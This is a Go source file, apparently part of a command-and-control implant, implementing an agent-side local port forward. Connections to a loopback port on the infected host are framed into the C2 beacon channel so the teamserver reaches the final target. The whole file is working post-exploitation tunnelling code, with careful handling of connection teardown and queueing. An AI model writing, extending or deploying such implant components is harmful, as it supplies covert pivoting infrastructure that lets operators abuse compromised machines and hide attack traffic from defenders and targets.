//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"sync"
	"time"
)

// ── Agent-side local port forward (lportfwd) ────────────────────────────────
// The `lportfwd` task ("<lport>|<targetHost:targetPort>") binds a loopback TCP
// listener on the agent. Every accepted connection is TUNNELED through the C2
// channel: bytes are framed as lportfwd_connect/lportfwd_data/lportfwd_close
// and ride the same beacon pipeline as the SOCKS relay; the teamserver dials
// the final target, so the destination sees the C2 server's egress address.
//
// This is the reverse of rportfwd_listener.go, which bridges directly to a
// target on the agent's own network without a C2 round trip.

var (
	lpfMu        sync.Mutex
	lpfListeners = map[int]*lpfListener{}
	// lpfConns tracks tunneled connections by ConnID so inbound frames from
	// the server can be written back into the local process's socket.
	lpfConns = map[uint64]*lpfConn{}
)

type lpfListener struct {
	lport  int
	target string
	ln     net.Listener
	closed bool
	wg     sync.WaitGroup
}

type lpfConn struct {
	connID  uint64
	tcpConn net.Conn
	mu      sync.Mutex
	closed  bool
	// outbound buffers frames destined for the server until doBeacon collects
	// them (same bounded-queue discipline as the SOCKS relay).
	outbound []socksFrame
}

func lpfNextConnID() uint64 {
	var b [8]byte
	_, _ = rand.Read(b[:])
	return binary.BigEndian.Uint64(b[:])
}

// startLPortForward binds 127.0.0.1:lport and starts tunneling accepted
// connections toward target via the C2 channel. Loopback-only binding is the
// honest lportfwd semantic: the forwarder serves local processes, it does not
// expose a new network-reachable service on the host.
func startLPortForward(lport int, target string) (string, error) {
	if lport < 1 || lport > 65535 {
		return "", fmt.Errorf("invalid listener port: %d", lport)
	}
	host, portStr, err := net.SplitHostPort(target)
	if err != nil || host == "" {
		return "", fmt.Errorf("invalid target %q: want host:port", target)
	}
	if _, err := strconv.Atoi(portStr); err != nil {
		return "", fmt.Errorf("invalid target port in %q", target)
	}

	lpfMu.Lock()
	if existing, ok := lpfListeners[lport]; ok && !existing.closed {
		lpfMu.Unlock()
		return "", fmt.Errorf("lportfwd already listening on :%d", lport)
	}
	lpfMu.Unlock()

	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", lport))
	if err != nil {
		return "", err
	}

	h := &lpfListener{lport: lport, target: target, ln: ln}
	lpfMu.Lock()
	lpfListeners[lport] = h
	lpfMu.Unlock()

	h.wg.Add(1)
	go h.acceptLoop()
	return ln.Addr().String(), nil
}

func (h *lpfListener) acceptLoop() {
	defer h.wg.Done()
	for {
		conn, err := h.ln.Accept()
		if err != nil {
			lpfMu.Lock()
			h.closed = true
			lpfMu.Unlock()
			return
		}
		// Windows backlog race: an in-flight Accept can still hand us a
		// connection AFTER the listener was closed for shutdown. Tunneling it
		// would block wg.Wait() forever, so reject it instead.
		lpfMu.Lock()
		closed := h.closed
		lpfMu.Unlock()
		if closed {
			conn.Close()
			return
		}
		h.wg.Add(1)
		go h.tunnel(conn)
	}
}

// tunnel frames one accepted local connection through the C2 channel.
func (h *lpfListener) tunnel(in net.Conn) {
	defer h.wg.Done()
	cid := lpfNextConnID()

	lc := &lpfConn{connID: cid, tcpConn: in}
	lpfMu.Lock()
	lpfConns[cid] = lc
	lpfMu.Unlock()

	// Announce the connection with its target so the server side stays
	// stateless w.r.t. session configuration.
	lpfEnqueueOut(lc, "lportfwd_connect", []byte(h.target))

	defer func() {
		lpfEnqueueOut(lc, "lportfwd_close", nil)
		// Keep the entry queued until the collector has drained the residual
		// frames (incl. this close): deleting here dropped everything since
		// the last beacon, so the server never saw the tail or the close.
		lc.mu.Lock()
		lc.closed = true
		lc.tcpConn.Close()
		lc.mu.Unlock()
		in.Close()
	}()

	buf := make([]byte, 16*1024)
	for {
		in.SetReadDeadline(time.Now().Add(15 * time.Minute))
		n, err := in.Read(buf)
		if n > 0 {
			lpfEnqueueOut(lc, "lportfwd_data", append([]byte{}, buf[:n]...))
		}
		if err != nil {
			return
		}
	}
}

// lpfEnqueueOut buffers an outbound frame for the connection, applying the
// same drop-oldest bound as the SOCKS relay so a fast local writer cannot
// grow agent memory without limit while the beacon link is slow.
func lpfEnqueueOut(lc *lpfConn, action string, data []byte) {
	lc.mu.Lock()
	defer lc.mu.Unlock()
	if lc.closed && action == "lportfwd_data" {
		return
	}
	if len(lc.outbound) >= socksMaxConnOut {
		lc.outbound = lc.outbound[1:]
	}
	lc.outbound = append(lc.outbound, socksFrame{ConnID: lc.connID, Action: action, Data: data})
}

// lportfwdCollectOutbound drains every tunneled connection's pending frames
// for attachment to the next beacon (called from doBeacon). Closed legs are
// reaped only after full drain so their tail frames always ship.
func lportfwdCollectOutbound() []socksFrame {
	lpfMu.Lock()
	defer lpfMu.Unlock()
	var frames []socksFrame
	for cid, lc := range lpfConns {
		lc.mu.Lock()
		if len(lc.outbound) > 0 {
			frames = append(frames, lc.outbound...)
			lc.outbound = nil
		}
		if lc.closed && len(lc.outbound) == 0 {
			delete(lpfConns, cid)
		}
		lc.mu.Unlock()
	}
	return frames
}

// lportfwdHandleFrames applies server-bound traffic arriving inside beacon
// responses (wired next to socksProcessFrames).
func lportfwdHandleFrames(frames []socksFrame) {
	for _, f := range frames {
		switch f.Action {
		case "lportfwd_data":
			lpfWrite(f.ConnID, f.Data)
		case "lportfwd_close":
			lpfCloseLocal(f.ConnID)
		}
	}
}

func lpfWrite(connID uint64, data []byte) {
	lpfMu.Lock()
	lc, ok := lpfConns[connID]
	lpfMu.Unlock()
	if !ok || len(data) == 0 {
		return
	}
	lc.mu.Lock()
	defer lc.mu.Unlock()
	if lc.closed || lc.tcpConn == nil {
		return
	}
	lc.tcpConn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	if _, err := lc.tcpConn.Write(data); err != nil {
		lc.closed = true
		lc.tcpConn.Close()
		return
	}
	lc.tcpConn.SetWriteDeadline(time.Time{})
}

// lpfCloseLocal tears down the local leg after the server reports the target
// leg closed (or failed to open). The entry stays queued until the collector
// drains the trailing close frame, then reaps it.
func lpfCloseLocal(connID uint64) {
	lpfMu.Lock()
	lc, ok := lpfConns[connID]
	lpfMu.Unlock()
	if !ok {
		return
	}
	lc.mu.Lock()
	wasClosed := lc.closed
	lc.closed = true
	if lc.tcpConn != nil {
		lc.tcpConn.Close()
	}
	lc.mu.Unlock()
	if !wasClosed {
		lpfEnqueueOut(lc, "lportfwd_close", nil)
	}
}

// stopLPortForward closes the loopback listener and all live tunnels.
// Returns the number of active connections that were torn down.
func stopLPortForward(lport int) (int, error) {
	lpfMu.Lock()
	h, ok := lpfListeners[lport]
	if ok {
		delete(lpfListeners, lport)
	}
	var conns []*lpfConn
	for _, lc := range lpfConns {
		conns = append(conns, lc)
	}
	if ok {
		// Mark closed BEFORE releasing the lock so an in-flight Accept that
		// succeeds despite ln.Close() sees the flag and bails out.
		h.closed = true
	}
	lpfMu.Unlock()
	if !ok {
		return 0, fmt.Errorf("no lportfwd active on :%d", lport)
	}

	// Force the blocked Accept to return NOW: on Windows, ln.Close() does not
	// reliably wake a pending Accept (backlog race), which left the accept
	// loop parked forever and stopLPortForward hanging on h.wg.Wait().
	// An immediate listener deadline makes Accept return a timeout error.
	if tcpln, ok := h.ln.(*net.TCPListener); ok {
		_ = tcpln.SetDeadline(time.Now())
	}
	_ = h.ln.Close()

	// Force-unblock every tunnel reader immediately. Relying on Close alone
	// left tunnels parked in Read until their 15-minute deadline.
	for _, lc := range conns {
		lc.mu.Lock()
		if lc.tcpConn != nil {
			now := time.Now()
			_ = lc.tcpConn.SetReadDeadline(now)
			_ = lc.tcpConn.SetWriteDeadline(now)
		}
		lc.mu.Unlock()
	}

	for _, lc := range conns {
		lpfCloseLocal(lc.connID)
	}

	// Bounded teardown: a wedged tunnel must not hang the caller (or, in the
	// worst case, the whole implant main loop) forever.
	done := make(chan struct{})
	go func() {
		h.wg.Wait()
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		return len(conns), fmt.Errorf("lportfwd stop timed out waiting for tunnels to drain")
	}
	return len(conns), nil
}
